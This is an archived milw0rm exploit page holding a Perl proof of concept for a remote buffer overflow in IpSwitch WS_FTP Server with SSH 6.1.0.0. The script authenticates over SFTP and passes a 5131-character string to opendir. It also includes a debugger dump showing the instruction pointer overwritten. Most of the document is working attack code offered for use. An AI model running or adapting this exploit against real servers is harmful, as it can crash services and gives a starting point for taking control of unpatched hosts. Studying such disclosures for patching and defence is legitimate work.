<html><head><title>IpSwitch WS_FTP Server with SSH 6.1.0.0 Remote Buffer Overflow PoC</title></head><pre># IpSwitch WS_FTPSERVER with SSH remote Buffer Overflow
#
# Website:http://www.wsftp.com/products/ws_ftp_server/
#
# Version:6.1.0.0 ( last one,others might be vuln too )
#
# Bug: Remote Buffer Overflow ( CD)
#
# (8e8.a78): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000000 ebx=00000000 ecx=00410041 edx=7c9137d8 esi=00000000 edi=00000000
# eip=00410041 esp=04b8c830 ebp=04b8c850 iopl=0         nv up ei pl zr na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
# 00410041 ??               ???
#
#
#Here's the PoC :



use strict;
use Net::SSH2;
my $ip=&quot;127.0.0.1&quot;;
my $port=22;
my $user=&quot;USERNAME&quot;;
my $pass=&quot;PASSWORD&quot;;
my $ssh2 = Net::SSH2-&gt;new();
my $payload =&quot;A&quot; x 5131;
$ssh2-&gt;connect($ip, $port) || die &quot;could not connect&quot;;
$ssh2-&gt;auth_password($user,$pass)|| die &quot;wrong passwd/login&quot;;
print &quot;Poc running ...\n&quot;;
my $sftp = $ssh2-&gt;sftp
my $dir = $sftp-&gt;opendir($payload); 
print &quot;Buffer Overflow Successfull\n&quot;;
$ssh2-&gt;disconnect();
exit;

# milw0rm.com [2008-02-03]</pre></html>